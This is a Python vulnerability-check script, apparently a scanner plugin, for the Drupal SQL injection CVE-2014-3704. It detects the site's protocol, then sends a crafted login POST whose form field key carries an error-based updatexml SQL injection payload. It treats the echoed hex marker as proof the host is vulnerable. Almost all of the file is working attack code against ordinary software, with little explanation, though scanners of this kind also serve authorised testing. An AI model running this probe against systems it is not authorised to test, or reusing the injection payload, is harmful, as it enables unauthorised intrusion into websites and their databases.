# -*- coding:utf-8 -*-
#Drupal Database Abstraction API SQL注入漏洞(CVE-2014-3704)

import requests,sys,random,string,binascii

headers = {
    "Content-Type":"application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Edge/86.0.622.56"
}
def http_proto_judge(ip,port):  #判断http及https协议头
    try:
        http_prots = ['http://','https://']
        for http_proto in http_prots:
            url = '{http_prot}{ip}:{port}/'.format(http_prot=http_proto, ip=ip, port=port)
            get_url = requests.get(url, timeout=5, allow_redirects=False, verify=False, headers=headers)
            if get_url.status_code == 200 or get_url.status_code == 301 or get_url.status_code == 302:
                return http_proto
            else:
                continue
    except Exception as msg:
        #print(msg)
        return False
        
def check_vuln(ip,port):
	http_proto = http_proto_judge(ip,port)
	url = "{http_proto}{ip}:{port}/node?destination=node".format(http_proto=http_proto,ip=ip,port=port)
	#print(url)
	flag = ''.join(random.sample(string.ascii_letters, 20))  # 随机字符串，用以验证是否可以成功命令执行
	data = "pass=lol&form_build_id=&form_id=user_login_block&op=Login&name[0 or updatexml(0,concat(0xa,hex('{flag}')),0)%23]=bob&name[0]=a".format(flag=flag)
	data = data.encode()
	try:
		#print(flag,type(flag))
		hex_flag = binascii.hexlify(flag.encode())
		#print(hex_flag,type(hex_flag))
		hex_flag = hex_flag.decode()
		#print(hex_flag,type(hex_flag))
		res =requests.post(url=url,headers=headers,data=data,timeout=5)
		if hex_flag.upper()[:-9] in res.text:			
			#print ("Vuln exists")
			return True
		else:
			#print ("No vuln")
			return False
	except Exception as msg:
		print(msg)
		return False


#if __name__ == '__main__':
#	check_vuln('192.168.56.123',8082)
